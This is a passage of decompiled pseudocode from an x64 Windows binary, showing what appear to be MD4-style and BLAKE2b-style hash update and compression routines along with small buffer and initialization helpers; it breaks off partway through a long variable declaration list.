  *(_WORD *)a1 = *(_DWORD *)a2;
  *(_BYTE *)(a1 + 2) = BYTE2(v7);
  *(_BYTE *)(a1 + 3) = HIBYTE(v7);
  *(_DWORD *)(a1 + 4) = *(_DWORD *)(a2 + 4);
  *(_DWORD *)(a1 + 8) = *(_DWORD *)(a2 + 8);
  result = 1i64;
  *(_DWORD *)(a1 + 12) = *(_DWORD *)(a2 + 12);
  return result;
}

//----- (0000000140098D30) ----------------------------------------------------
__int64 __fastcall sub_140098D30(__int64 a1, unsigned __int8 *a2, size_t a3)
{
  size_t v3; // rdi
  unsigned __int8 *v4; // rbp
  unsigned int v6; // eax
  unsigned int v7; // ecx
  __int64 v8; // rcx
  _QWORD *v9; // r14
  __int64 v10; // rbx
  size_t v11; // rbx

  v3 = a3;
  v4 = a2;
  if ( a3 )
  {
    v6 = *(_DWORD *)(a1 + 16);
    v7 = v6 + 8 * a3;
    if ( v7 < v6 )
      ++*(_DWORD *)(a1 + 20);
    *(_DWORD *)(a1 + 16) = v7;
    v8 = *(unsigned int *)(a1 + 88);
    *(_DWORD *)(a1 + 20) += a3 >> 29;
    if ( v8 )
    {
      v9 = (_QWORD *)(a1 + 24);
      if ( a3 < 0x40 && v8 + a3 < 0x40 )
      {
        memmove((char *)v9 + v8, a2, a3);
        *(_DWORD *)(a1 + 88) += v3;
        return 1i64;
      }
      v10 = 64 - v8;
      memmove((char *)v9 + v8, a2, 64 - v8);
      sub_140098E60((int *)a1, (unsigned __int8 *)(a1 + 24), 1i64);
      *(_DWORD *)(a1 + 88) = 0;
      v4 += v10;
      v3 -= v10;
      *v9 = 0i64;
      *(_QWORD *)(a1 + 32) = 0i64;
      *(_QWORD *)(a1 + 40) = 0i64;
      *(_QWORD *)(a1 + 48) = 0i64;
      *(_QWORD *)(a1 + 56) = 0i64;
      *(_QWORD *)(a1 + 64) = 0i64;
      *(_QWORD *)(a1 + 72) = 0i64;
      *(_QWORD *)(a1 + 80) = 0i64;
    }
    if ( v3 >> 6 )
    {
      sub_140098E60((int *)a1, v4, v3 >> 6);
      v11 = v3 >> 6 << 6;
      v4 += v11;
      v3 -= v11;
    }
    if ( v3 )
    {
      *(_DWORD *)(a1 + 88) = v3;
      memmove((void *)(a1 + 24), v4, v3);
    }
  }
  return 1i64;
}

//----- (0000000140098E60) ----------------------------------------------------
void __fastcall sub_140098E60(int *a1, unsigned __int8 *a2, __int64 a3)
{
  int v3; // edi
  __int64 v4; // rax
  int v5; // ebx
  int v6; // r11d
  int v7; // esi
  int v8; // ecx
  int v9; // r8d
  int v10; // r9d
  int v11; // r10d
  int v12; // r11d
  int v13; // ecx
  int v14; // r8d
  int v15; // ebx
  int v16; // r13d
  int v17; // r10d
  int v18; // r12d
  int v19; // r11d
  int v20; // r9d
  int v21; // ebp
  int v22; // ecx
  int v23; // r15d
  int v24; // r8d
  int v25; // eax
  int v26; // esi
  int v27; // r14d
  int v28; // r10d
  int v29; // esi
  int v30; // r11d
  int v31; // r14d
  int v32; // ebx
  int v33; // r9d
  int v34; // r10d
  int v35; // r11d
  int v36; // ebx
  int v37; // r9d
  int v38; // r10d
  int v39; // r11d
  int v40; // ebx
  int v41; // r9d
  int v42; // r10d
  int v43; // r11d
  int v44; // edi
  int v45; // ebx
  int v46; // r9d
  int v47; // r10d
  int v48; // r11d
  int v49; // r8d
  int v50; // r9d
  int v51; // r10d
  int v52; // r11d
  int v53; // r8d
  int v54; // r9d
  int v55; // r10d
  int v56; // r11d
  int v57; // r8d
  int v58; // ebx
  int v59; // edi
  int v60; // r11d
  int v61; // r9d
  int v62; // r10d
  int v63; // r8d
  int v64; // [rsp+0h] [rbp-78h]
  int v65; // [rsp+4h] [rbp-74h]
  int v66; // [rsp+8h] [rbp-70h]
  int v67; // [rsp+Ch] [rbp-6Ch]
  int v68; // [rsp+10h] [rbp-68h]
  int v69; // [rsp+14h] [rbp-64h]
  int v70; // [rsp+18h] [rbp-60h]
  int v71; // [rsp+1Ch] [rbp-5Ch]
  int v72; // [rsp+20h] [rbp-58h]
  int v73; // [rsp+24h] [rbp-54h]
  int v74; // [rsp+28h] [rbp-50h]
  int v76; // [rsp+88h] [rbp+10h]
  __int64 v77; // [rsp+90h] [rbp+18h]
  int v78; // [rsp+98h] [rbp+20h]

  if ( a3 )
  {
    v3 = a1[1];
    v4 = a3;
    v5 = a1[2];
    v6 = a1[3];
    v7 = *a1;
    v72 = v3;
    v73 = v5;
    v74 = v6;
    do
    {
      v77 = v4 - 1;
      v76 = (a2[3] << 24) | (a2[2] << 16) | (a2[1] << 8) | *a2;
      v8 = __ROL4__(v7 + v76 + (v6 ^ v3 & (v5 ^ v6)), 3);
      v66 = (a2[7] << 24) | (a2[6] << 16) | *((unsigned __int16 *)a2 + 2);
      v9 = __ROL4__(v6 + v66 + (v5 ^ v8 & (v3 ^ v5)), 7);
      v64 = (a2[11] << 24) | (a2[10] << 16) | *((unsigned __int16 *)a2 + 4);
      v10 = __ROL4__(v5 + v64 + (v3 ^ v9 & (v8 ^ v3)), 11);
      v69 = (a2[15] << 24) | (a2[14] << 16) | *((unsigned __int16 *)a2 + 6);
      v78 = (a2[19] << 24) | (a2[18] << 16) | *((unsigned __int16 *)a2 + 8);
      v11 = __ROL4__(v3 + v69 + (v8 ^ v10 & (v8 ^ v9)), 19);
      v12 = __ROL4__(v8 + v78 + (v9 ^ v11 & (v10 ^ v9)), 3);
      v68 = (a2[23] << 24) | (a2[22] << 16) | *((unsigned __int16 *)a2 + 10);
      v13 = __ROL4__(v9 + v68 + (v10 ^ v12 & (v11 ^ v10)), 7);
      v65 = (a2[27] << 24) | (a2[26] << 16) | *((unsigned __int16 *)a2 + 12);
      v14 = __ROL4__(v10 + v65 + (v11 ^ v13 & (v12 ^ v11)), 11);
      v71 = (a2[31] << 24) | (a2[30] << 16) | *((unsigned __int16 *)a2 + 14);
      v15 = __ROL4__(v11 + v71 + (v12 ^ v14 & (v12 ^ v13)), 19);
      v16 = (a2[35] << 24) | (a2[34] << 16) | *((unsigned __int16 *)a2 + 16);
      v67 = (a2[39] << 24) | (a2[38] << 16) | (a2[37] << 8) | a2[36];
      v17 = __ROL4__(v12 + v16 + (v13 ^ v15 & (v14 ^ v13)), 3);
      v18 = (a2[43] << 24) | (a2[42] << 16) | *((unsigned __int16 *)a2 + 20);
      v19 = __ROL4__(v13 + v67 + (v14 ^ v17 & (v15 ^ v14)), 7);
      v20 = __ROL4__(v14 + v18 + (v15 ^ v19 & (v17 ^ v15)), 11);
      v70 = (a2[47] << 24) | (a2[46] << 16) | (a2[45] << 8) | a2[44];
      v21 = (a2[51] << 24) | (a2[50] << 16) | *((unsigned __int16 *)a2 + 24);
      v22 = __ROL4__(v15 + v70 + (v17 ^ v20 & (v17 ^ v19)), 19);
      v23 = (a2[55] << 24) | (a2[54] << 16) | (a2[53] << 8) | a2[52];
      v24 = __ROL4__(v17 + v21 + (v19 ^ v22 & (v20 ^ v19)), 3);
      v25 = a2[57];
      v26 = a2[56];
      v27 = a2[60];
      a2 += 64;
      v28 = __ROL4__(v19 + v23 + (v20 ^ v24 & (v22 ^ v20)), 7);
      v29 = (*(a2 - 5) << 24) | (*(a2 - 6) << 16) | (v25 << 8) | v26;
      v30 = __ROL4__(v20 + v29 + (v22 ^ v28 & (v24 ^ v22)), 11);
      v31 = (*(a2 - 1) << 24) | (*(a2 - 2) << 16) | (*(a2 - 3) << 8) | v27;
      v32 = __ROL4__(v22 + v31 + (v24 ^ v30 & (v24 ^ v28)), 19);
      v33 = __ROL4__(v76 + (v32 & v30 | v28 & (v32 | v30)) + v24 + 1518500249, 3);
      v34 = __ROL4__(v78 + (v33 & v32 | v30 & (v33 | v32)) + 1518500249 + v28, 5);
      v35 = __ROL4__(v16 + (v33 & v32 | v34 & (v33 | v32)) + 1518500249 + v30, 9);
      v36 = __ROL4__(v21 + (v33 & v35 | v34 & (v33 | v35)) + 1518500249 + v32, 13);
      v37 = __ROL4__(v66 + (v36 & v35 | v34 & (v36 | v35)) + 1518500249 + v33, 3);
      v38 = __ROL4__(v68 + (v37 & v36 | v35 & (v37 | v36)) + 1518500249 + v34, 5);
      v39 = __ROL4__(v67 + (v37 & v36 | v38 & (v37 | v36)) + 1518500249 + v35, 9);
      v40 = __ROL4__(v23 + (v37 & v39 | v38 & (v37 | v39)) + 1518500249 + v36, 13);
      v41 = __ROL4__(v64 + (v40 & v39 | v38 & (v40 | v39)) + 1518500249 + v37, 3);
      v42 = __ROL4__(v65 + (v41 & v40 | v39 & (v41 | v40)) + 1518500249 + v38, 5);
      v43 = __ROL4__(v18 + (v41 & v40 | v42 & (v41 | v40)) + 1518500249 + v39, 9);
      v44 = __ROL4__(v29 + (v41 & v43 | v42 & (v41 | v43)) + v40 + 1518500249, 13);
      v45 = __ROL4__(v69 + (v44 & v43 | v42 & (v44 | v43)) + v41 + 1518500249, 3);
      v46 = __ROL4__(v71 + (v45 & v44 | v43 & (v45 | v44)) + v42 + 1518500249, 5);
      v47 = __ROL4__(v70 + (v45 & v44 | v46 & (v45 | v44)) + v43 + 1518500249, 9);
      v48 = __ROL4__(v44 + v31 + (v45 & v47 | v46 & (v45 | v47)) + 1518500249, 13);
      v49 = __ROL4__(v45 + v76 + (v48 ^ v47 ^ v46) + 1859775393, 3);
      v50 = __ROL4__(v16 + (v49 ^ v48 ^ v47) + 1859775393 + v46, 9);
      v51 = __ROL4__(v78 + (v49 ^ v48 ^ v50) + 1859775393 + v47, 11);
      v52 = __ROL4__(v21 + (v49 ^ v51 ^ v50) + 1859775393 + v48, 15);
      v53 = __ROL4__(v64 + (v52 ^ v51 ^ v50) + 1859775393 + v49, 3);
      v54 = __ROL4__(v18 + (v53 ^ v52 ^ v51) + 1859775393 + v50, 9);
      v55 = __ROL4__(v65 + (v53 ^ v52 ^ v54) + 1859775393 + v51, 11);
      v56 = __ROL4__(v29 + (v53 ^ v55 ^ v54) + 1859775393 + v52, 15);
      v57 = __ROL4__(v66 + (v56 ^ v55 ^ v54) + 1859775393 + v53, 3);
      v58 = __ROL4__(v67 + (v57 ^ v56 ^ v55) + v54 + 1859775393, 9);
      v59 = __ROL4__(v68 + (v57 ^ v56 ^ v58) + v55 + 1859775393, 11);
      v60 = __ROL4__(v23 + (v57 ^ v59 ^ v58) + 1859775393 + v56, 15);
      v61 = __ROL4__(v69 + (v60 ^ v59 ^ v58) + v57 + 1859775393, 3);
      v62 = __ROL4__(v70 + (v61 ^ v60 ^ v59) + v58 + 1859775393, 9);
      v63 = __ROL4__(v71 + (v61 ^ v60 ^ v62) + v59 + 1859775393, 11);
      *a1 += v61;
      v7 = *a1;
      v3 = __ROL4__(v31 + (v61 ^ v63 ^ v62) + v60 + 1859775393, 15) + v72;
      a1[1] = v3;
      a1[2] = v63 + v73;
      v5 = v63 + v73;
      v73 += v63;
      v72 = v3;
      a1[3] = v62 + v74;
      v6 = v62 + v74;
      v4 = v77;
      v74 += v62;
    }
    while ( v77 );
  }
}

//----- (0000000140099660) ----------------------------------------------------
__int64 __fastcall sub_140099660(char *a1, __m128i *a2)
{
  __int64 v2; // rax
  __int64 v5; // rcx
  signed __int64 v6; // rdx

  v2 = a2[14].m128i_i64[0];
  a2[5].m128i_i64[0] = -1i64;
  memset(&a2[6].m128i_i8[v2], 0, 128 - v2);
  sub_140099850(a2->m128i_i64, a2 + 6, a2[14].m128i_u64[0]);
  v5 = 8i64;
  v6 = (char *)a2 - a1;
  do
  {
    *(_QWORD *)a1 = *(_QWORD *)&a1[v6];
    a1 += 8;
    --v5;
  }
  while ( v5 );
  sub_140023440((__int64)a2, 232i64);
  return 1i64;
}

//----- (00000001400996F0) ----------------------------------------------------
__int64 __fastcall sub_1400996F0(_QWORD *a1)
{
  __int64 v2[2]; // [rsp+20h] [rbp-58h] BYREF
  __int16 v3; // [rsp+30h] [rbp-48h]
  __int64 v4; // [rsp+32h] [rbp-46h]
  __int64 v5; // [rsp+3Ah] [rbp-3Eh]
  __int64 v6; // [rsp+42h] [rbp-36h]
  __int64 v7; // [rsp+4Ah] [rbp-2Eh]
  __int64 v8; // [rsp+52h] [rbp-26h]
  int v9; // [rsp+5Ah] [rbp-1Eh]
  __int16 v10; // [rsp+5Eh] [rbp-1Ah]

  v2[0] = 16842816i64;
  v2[1] = 0i64;
  v3 = 0;
  v4 = 0i64;
  v5 = 0i64;
  v6 = 0i64;
  v7 = 0i64;
  v8 = 0i64;
  v9 = 0;
  v10 = 0;
  sub_14009BD60(a1, (__int64)v2);
  return 1i64;
}

//----- (0000000140099770) ----------------------------------------------------
__int64 __fastcall sub_140099770(__m128i *a1, __m128i *a2, unsigned __int64 a3)
{
  __int64 v3; // rax
  __int64 v4; // rsi
  size_t v5; // rbx
  __int64 v6; // r14
  __m128i *v7; // rbp
  unsigned __int64 v9; // rbx

  v3 = a1[14].m128i_i64[0];
  v4 = 128i64;
  v5 = a3;
  v6 = 128 - v3;
  v7 = a2;
  if ( a3 > 128 - v3 )
  {
    if ( v3 )
    {
      memmove(&a1[6].m128i_i8[v3], a2, 128 - v3);
      sub_140099850(a1->m128i_i64, a1 + 6, 0x80ui64);
      v7 = (__m128i *)((char *)v7 + v6);
      a1[14].m128i_i64[0] = 0i64;
      v5 -= v6;
    }
    if ( v5 > 0x80 )
    {
      if ( (v5 & 0x7F) != 0 )
        v4 = v5 & 0x7F;
      v9 = v5 - v4;
      sub_140099850(a1->m128i_i64, v7, v9);
      v7 = (__m128i *)((char *)v7 + v9);
      v5 = v4;
    }
  }
  memmove(&a1[6].m128i_i8[a1[14].m128i_i64[0]], v7, v5);
  a1[14].m128i_i64[0] += v5;
  return 1i64;
}

//----- (0000000140099850) ----------------------------------------------------
unsigned __int64 __fastcall sub_140099850(__int64 *a1, __m128i *a2, unsigned __int64 a3)
{
  __int64 v3; // r12
  unsigned __int64 result; // rax
  __int64 v5; // rbp
  __int64 v6; // rsi
  __int64 v7; // r10
  unsigned __int64 v8; // r13
  __int64 v9; // rdi
  __int64 v10; // r14
  __m128i v11; // xmm3
  __m128i v12; // xmm4
  __m128i v13; // xmm5
  __m128i v14; // xmm6
  __m128i v15; // xmm7
  __m128i v16; // xmm8
  __m128i v17; // xmm9
  __m128i v18; // xmm10
  unsigned __int64 v19; // rbx
  __int64 v20; // rbp
  __int64 v21; // rbx
  __int64 v22; // r9
  __int64 v23; // rdx
  __int64 v24; // rbp
  __int64 v25; // rbx
  __int64 v26; // rsi
  __int64 v27; // r8
  __int64 v28; // rdi
  __int64 v29; // rdx
  __int64 v30; // rax
  __int64 v31; // r10
  __int64 v32; // rsi
  __int64 v33; // r15
  __int64 v34; // r8
  __int64 v35; // rdx
  unsigned __int64 v36; // r13
  __int64 v37; // r15
  __int64 v38; // r8
  __int64 v39; // r11
  __int64 v40; // r12
  __int64 v41; // r10
  __int64 v42; // rdx
  unsigned __int64 v43; // r13
  __int64 v44; // r11
  __int64 v45; // rbp
  __int64 v46; // r12
  __int64 v47; // r9
  __int64 v48; // rdx
  __int64 v49; // r8
  __int64 v50; // rsi
  __int64 v51; // r14
  __int64 v52; // rdx
  __int64 v53; // r12
  __int64 v54; // rsi
  __int64 v55; // r8
  __int64 v56; // r10
  __int64 v57; // rbp
  __int64 v58; // r11
  __int64 v59; // r12
  __int64 v60; // r8
  __int64 v61; // rbx
  __int64 v62; // r11
  __int64 v63; // rdx
  __int64 v64; // r8
  __int64 v65; // rbx
  __int64 v66; // r10
  __int64 v67; // rdx
  __int64 v68; // r8
  __int64 v69; // rdi
  __int64 v70; // r9
  __int64 v71; // rdx
  __int64 v72; // rbp
  __int64 v73; // rbx
  __int64 v74; // r8
  __int64 v75; // rbp
  __int64 v76; // rbp
  __int64 v77; // rbx
  __int64 v78; // r8
  __int64 v79; // r9
  __int64 v80; // rdx
  __int64 v81; // r8
  __int64 v82; // r9
  __int64 v83; // rsi
  __int64 v84; // r9
  __int64 v85; // rsi
  __int64 v86; // rdi
  __int64 v87; // r8
  __int64 v88; // rdx
  __int64 v89; // rdi
  __int64 v90; // r8
  __int64 v91; // r9
  __int64 v92; // r14
  __int64 v93; // r11
  __int64 v94; // rdx
  __int64 v95; // r14
  __int64 v96; // r11
  __int64 v97; // r10
  __int64 v98; // rdx
  __int64 v99; // r8
  __int64 v100; // rsi
  __int64 v101; // r14
  __int64 v102; // rsi
  __int64 v103; // rdx
  __int64 v104; // r11
  __int64 v105; // r8
  __int64 v106; // rbp
  __int64 v107; // r9
  __int64 v108; // rax
  __int64 v109; // r8
  __int64 v110; // rdx
  __int64 v111; // rax
  __int64 v112; // r10
  __int64 v113; // rdx
  __int64 v114; // r8
  __int64 v115; // rbx
  __int64 v116; // rdi
  __int64 v117; // rdx
  __int64 v118; // rbp
  __int64 v119; // r11
  __int64 v120; // r8
  __int64 v121; // rbp
  __int64 v122; // r11
  __int64 v123; // r8
  __int64 v124; // rdi
  __int64 v125; // rdx
  __int64 v126; // r8
  __int64 v127; // r8
  __int64 v128; // rdi
  __int64 v129; // r8
  __int64 v130; // rdi
  __int64 v131; // rbx
  __int64 v132; // rsi
  __int64 v133; // rdx
  __int64 v134; // rbx
  __int64 v135; // rsi
  __int64 v136; // r9
  __int64 v137; // r14
  __int64 v138; // r8
  __int64 v139; // rdx
  __int64 v140; // r14
  __int64 v141; // r8
  __int64 v142; // r10
  __int64 v143; // rdx
  __int64 v144; // rsi
  __int64 v145; // rdi
  __int64 v146; // r14
  __int64 v147; // rdi
  __int64 v148; // rdx
  __int64 v149; // r8
  __int64 v150; // rsi
  __int64 v151; // rbp
  __int64 v152; // r9
  __int64 v153; // r8
  __int64 v154; // r9
  __int64 v155; // rdx
  __int64 v156; // rbp
  __int64 v157; // r10
  __int64 v158; // rdx
  __int64 v159; // r8
  __int64 v160; // rbx
  __int64 v161; // rdx
  __int64 v162; // rsi
  __int64 v163; // r11
  __int64 v164; // r8
  __int64 v165; // rsi
  __int64 v166; // rbp
  __int64 v167; // r11
  __int64 v168; // r8
  __int64 v169; // r11
  __int64 v170; // rdx
  __int64 v171; // rbp
  __int64 v172; // r8
  __int64 v173; // rdi
  __int64 v174; // r8
  __int64 v175; // rdi
  __int64 v176; // rbx
  __int64 v177; // rbp
  __int64 v178; // rdx
  __int64 v179; // rbx
  __int64 v180; // rbp
  __int64 v181; // r9
  __int64 v182; // r14
  __int64 v183; // r8
  __int64 v184; // rdx
  __int64 v185; // r14
  __int64 v186; // r8
  __int64 v187; // r10
  __int64 v188; // rdx
  __int64 v189; // rdi
  __int64 v190; // rbp
  __int64 v191; // rdi
  __int64 v192; // rdx
  __int64 v193; // r8
  __int64 v194; // rsi
  __int64 v195; // r9
  __int64 v196; // r14
  __int64 v197; // r8
  __int64 v198; // rdx
  __int64 v199; // r14
  __int64 v200; // r10
  __int64 v201; // rdx
  __int64 v202; // r8
  __int64 v203; // rbx
  __int64 v204; // rdx
  __int64 v205; // rsi
  __int64 v206; // r11
  __int64 v207; // r8
  __int64 v208; // rsi
  __int64 v209; // rsi
  __int64 v210; // rax
  __int64 v211; // r11
  __int64 v212; // r8
  __int64 v213; // r11
  __int64 v214; // rdx
  __int64 v215; // rax
  __int64 v216; // rdi
  __int64 v217; // rbx
  __int64 v218; // r8
  __int64 v219; // rdx
  __int64 v220; // rbx
  __int64 v221; // r9
  __int64 v222; // rbp
  __int64 v223; // r8
  __int64 v224; // rdx
  __int64 v225; // rbp
  __int64 v226; // r8
  __int64 v227; // r10
  __int64 v228; // rdx
  __int64 v229; // rdi
  __int64 v230; // rdi
  __int64 v231; // rbp
  __int64 v232; // rdi
  __int64 v233; // rdx
  __int64 v234; // r8
  __int64 v235; // rsi
  __int64 v236; // rax
  __int64 v237; // r9
  __int64 v238; // r8
  __int64 v239; // r9
  __int64 v240; // rdx
  __int64 v241; // rax
  __int64 v242; // r10
  __int64 v243; // rdx
  __int64 v244; // r8
  __int64 v245; // rbx
  __int64 v246; // rdx
  __int64 v247; // rsi
  __int64 v248; // r11
  __int64 v249; // r8
  __int64 v250; // rsi
  __int64 v251; // rax
  __int64 v252; // r11
  __int64 v253; // r8
  __int64 v254; // r11
  __int64 v255; // rdx
  __int64 v256; // rax
  __int64 v257; // rdi
  __int64 v258; // rbx
  __int64 v259; // r8
  __int64 v260; // rdx
  __int64 v261; // rbx
  __int64 v262; // r9
  __int64 v263; // rbp
  __int64 v264; // r8
  __int64 v265; // rdx
  __int64 v266; // rbp
  __int64 v267; // r8
  __int64 v268; // r10
  __int64 v269; // rdx
  __int64 v270; // rdi
  __int64 v271; // rdi
  __int64 v272; // rbp
  __int64 v273; // rdi
  __int64 v274; // rdx
  __int64 v275; // r8
  __int64 v276; // rsi
  __int64 v277; // rax
  __int64 v278; // r9
  __int64 v279; // r8
  __int64 v280; // r9
  __int64 v281; // rdx
  __int64 v282; // rax
  __int64 v283; // r10
  __int64 v284; // rdx
  __int64 v285; // r8
  __int64 v286; // rbx
  __int64 v287; // rdx
  __int64 v288; // rsi
  __int64 v289; // r11
  __int64 v290; // r8
  __int64 v291; // rsi
  __int64 v292; // rax
  __int64 v293; // r11
  __int64 v294; // r8
  __int64 v295; // r11
  __int64 v296; // rdx
  __int64 v297; // rax
  __int64 v298; // rdi
  __int64 v299; // rbx
  __int64 v300; // r8
  __int64 v301; // rdx
  __int64 v302; // rbx
  __int64 v303; // r9
  __int64 v304; // rbp
  __int64 v305; // r8
  __int64 v306; // rdx
  __int64 v307; // rbp
  __int64 v308; // r8
  __int64 v309; // r10
  __int64 v310; // rdx
  __int64 v311; // rdi
  __int64 v312; // rdi
  __int64 v313; // rbp
  __int64 v314; // rdi
  __int64 v315; // rdx
  __int64 v316; // r8
  __int64 v317; // rsi
  __int64 v318; // rax
  __int64 v319; // r9
  __int64 v320; // r8
  __int64 v321; // r9
  __int64 v322; // rdx
  __int64 v323; // rax
  __int64 v324; // r10
  __int64 v325; // rdx
  __int64 v326; // r8
  __int64 v327; // rbx
  __int64 v328; // rdx
  __int64 v329; // rsi
  __int64 v330; // r8
  __int64 v331; // rsi
  __int64 v332; // r11
  __int64 v333; // rax
  __int64 v334; // r8
  __int64 v335; // rdx
  __int64 v336; // rax
  __int64 v337; // rdi
  __int64 v338; // rbx
  __int64 v339; // r8
  __int64 v340; // rdx
  __int64 v341; // rbx
  __int64 v342; // r9
  __int64 v343; // rbp
  __int64 v344; // r8
  __int64 v345; // rdx
  __int64 v346; // rbp
  __int64 v347; // r8
  __int64 v348; // r10
  __int64 v349; // rdx
  __int64 v350; // rdi
  __int64 v351; // rdi
  __int64 v352; // rbp
  __int64 v353; // rdi
  __int64 v354; // rdx
  __int64 v355; // r8
  __int64 v356; // rsi
  __int64 v357; // rax
  __int64 v358; // r9
  __int64 v359; // r8
  __int64 v360; // r9
  __int64 v361; // rdx
  __int64 v362; // rax
  __int64 v363; // r10
  __int64 v364; // rdx
  __int64 v365; // r8
  __int64 v366; // rbx
  __int64 v367; // rdx
  __int64 v368; // rsi
  __int64 v369; // r11
  __int64 v370; // r8
  __int64 v371; // rsi
  __int64 v372; // rsi
  __int64 v373; // rax
  __int64 v374; // r11
  __int64 v375; // r8
  __int64 v376; // r11
  __int64 v377; // rdx
  __int64 v378; // rax
  __int64 v379; // r8
  __int64 v380; // rdi
  __int64 v381; // rbx
  __int64 v382; // r8
  __int64 v383; // rdi
  __int64 v384; // rdx
  __int64 v385; // rbx
  __int64 v386; // r9
  __int64 v387; // rbp
  __int64 v388; // r8
  __int64 v389; // rdx
  __int64 v390; // rbp
  __int64 v391; // r8
  __int64 v392; // r10
  __int64 v393; // rdx
  __int64 v394; // rdi
  __int64 v395; // rdi
  __int64 v396; // rbp
  __int64 v397; // rdi
  __int64 v398; // rdx
  __int64 v399; // r8
  __int64 v400; // rsi
  __int64 v401; // r9
  __int64 v402; // rax
  __int64 v403; // r8
  __int64 v404; // rdx
  __int64 v405; // rax
  __int64 v406; // r10
  __int64 v407; // rdx
  __int64 v408; // r8
  __int64 v409; // rbx
  __int64 v410; // rdx
  __int64 v411; // rsi
  __int64 v412; // r11
  __int64 v413; // r8
  __int64 v414; // rsi
  __int64 v415; // rsi
  __int64 v416; // r11
  __int64 v417; // rax
  __int64 v418; // r8
  __int64 v419; // rdx
  __int64 v420; // rax
  __int64 v421; // r8
  __int64 v422; // rdi
  __int64 v423; // rbx
  __int64 v424; // r8
  __int64 v425; // rdi
  __int64 v426; // rdx
  __int64 v427; // rbx
  __int64 v428; // r9
  __int64 v429; // rbp
  __int64 v430; // r8
  __int64 v431; // rdx
  __int64 v432; // rbp
  __int64 v433; // r8
  __int64 v434; // r10
  __int64 v435; // rdx
  __int64 v436; // rdi
  __int64 v437; // rbp
  __int64 v438; // rdi
  __int64 v439; // rdx
  __int64 v440; // r8
  __int64 v441; // rsi
  __int64 v442; // rax
  __int64 v443; // r9
  __int64 v444; // r8
  __int64 v445; // r9
  __int64 v446; // rdx
  __int64 v447; // rax
  __int64 v448; // r10
  __int64 v449; // rdx
  __int64 v450; // r8
  __int64 v451; // rbx
  __int64 v452; // r14
  __int64 v453; // rdx
  __int64 v454; // rsi
  __int64 v455; // r11
  __int64 v456; // r8
  __int64 v457; // rsi
  __int64 v458; // r11
  __int64 v459; // r8
  __int64 v460; // r14
  __int64 v461; // rdx
  __int64 v462; // r8
  __int64 v463; // rbx
  __int64 v464; // r14
  __int64 v465; // rdi
  __int64 v466; // rdx
  __int64 v467; // rbx
  __int64 v468; // r14
  __int64 v469; // r9
  __int64 v470; // rbp
  __int64 v471; // r8
  __int64 v472; // rdx
  __int64 v473; // rbp
  __int64 v474; // r8
  __int64 v475; // r10
  __int64 v476; // rdx
  __int64 v477; // r14
  __int64 v478; // rdi
  __int64 v479; // rax
  __int64 v480; // r14
  __int64 v481; // rdi
  __int64 v482; // rdx
  __int64 v483; // r8
  __int64 v484; // rsi
  __int64 v485; // rbp
  __int64 v486; // r9
  __int64 v487; // rdx
  __int64 v488; // r10
  __int64 v489; // rdx
  __int64 v490; // r8
  __int64 v491; // rbp
  __int64 v492; // rdx
  __int64 v493; // rbx
  __int64 v494; // rsi
  __int64 v495; // r11
  __int64 v496; // r8
  __int64 v497; // rbx
  __int64 v498; // rsi
  unsigned __int64 v499; // rbx
  __int64 v500; // rsi
  __int64 v501; // r11
  __int64 v502; // r8
  __int64 v503; // r13
  __int64 v504; // rdx
  __int64 v505; // r8
  __int64 v506; // r13
  __int64 v507; // rbx
  __int64 v508; // rbp
  __int64 v509; // r12
  __int64 v510; // rdx
  __int64 v511; // r15
  __int64 v512; // r8
  __int64 v513; // rbp
  __int64 v514; // r14
  __int64 v515; // r12
  __int64 v516; // rdi
  __int64 v517; // r9
  __int64 v518; // rdx
  __int64 v519; // r8
  __int64 v520; // r14
  __int64 v521; // rdi
  __int64 v522; // r10
  __int64 v523; // rdx
  __int64 v524; // r12
  __int64 v525; // rbx
  __int64 v526; // rax
  __int64 v527; // r12
  __int64 v528; // rdx
  __int64 v529; // rdi
  __int64 v530; // r8
  __int64 v531; // r14
  __int64 v532; // rdi
  __int64 v533; // r15
  __int64 v534; // r14
  __int64 v535; // rsi
  __int64 v536; // rdx
  __int64 v537; // r15
  __int64 v538; // r14
  __int64 v539; // r10
  __int64 v540; // rsi
  __int64 v541; // r10
  __int64 v542; // rdx
  __int64 v543; // r13
  __int64 v544; // r8
  __int64 v545; // r15
  __int64 v546; // rax
  __int64 v547; // r9
  __int64 v548; // r13
  __int64 v549; // rdx
  __int64 v550; // rdx
  bool v551; // zf
  unsigned __int64 v552; // [rsp+0h] [rbp-1F8h]
  unsigned __int64 v553; // [rsp+0h] [rbp-1F8h]
  unsigned __int64 v554; // [rsp+0h] [rbp-1F8h]
  unsigned __int64 v555; // [rsp+0h] [rbp-1F8h]
  unsigned __int64 v556; // [rsp+0h] [rbp-1F8h]
  __int64 v557; // [rsp+0h] [rbp-1F8h]
  __int64 v558; // [rsp+0h] [rbp-1F8h]
  __int64 v559; // [rsp+0h] [rbp-1F8h]
  __int64 v560; // [rsp+0h] [rbp-1F8h]
  __int64 v561; // [rsp+0h] [rbp-1F8h]
  __int64 v562; // [rsp+0h] [rbp-1F8h]
  __int64 v563; // [rsp+0h] [rbp-1F8h]
  __int64 v564; // [rsp+0h] [rbp-1F8h]
  __int64 v565; // [rsp+0h] [rbp-1F8h]
  __int64 v566; // [rsp+0h] [rbp-1F8h]
  __int64 v567; // [rsp+0h] [rbp-1F8h]
  __int64 v568; // [rsp+0h] [rbp-1F8h]
  __int64 v569; // [rsp+0h] [rbp-1F8h]
  __int64 v570; // [rsp+0h] [rbp-1F8h]
  __int64 v571; // [rsp+0h] [rbp-1F8h]
  __int64 v572; // [rsp+0h] [rbp-1F8h]
  __int64 v573; // [rsp+0h] [rbp-1F8h]
  __int64 v574; // [rsp+0h] [rbp-1F8h]
  __int64 v575; // [rsp+0h] [rbp-1F8h]
  __int64 v576; // [rsp+0h] [rbp-1F8h]
  __int64 v577; // [rsp+0h] [rbp-1F8h]
  __int64 v578; // [rsp+0h] [rbp-1F8h]
  __int64 v579; // [rsp+0h] [rbp-1F8h]
  __int64 v580; // [rsp+0h] [rbp-1F8h]
  __int64 v581; // [rsp+0h] [rbp-1F8h]
  __int64 v582; // [rsp+0h] [rbp-1F8h]
  __int64 v583; // [rsp+0h] [rbp-1F8h]
  __int64 v584; // [rsp+0h] [rbp-1F8h]
  __int64 v585; // [rsp+0h] [rbp-1F8h]
  __int64 v586; // [rsp+0h] [rbp-1F8h]
  __int64 v587; // [rsp+0h] [rbp-1F8h]
  __int64 v588; // [rsp+0h] [rbp-1F8h]
  __int64 v589; // [rsp+0h] [rbp-1F8h]
  __int64 v590; // [rsp+0h] [rbp-1F8h]
  __int64 v591; // [rsp+0h] [rbp-1F8h]
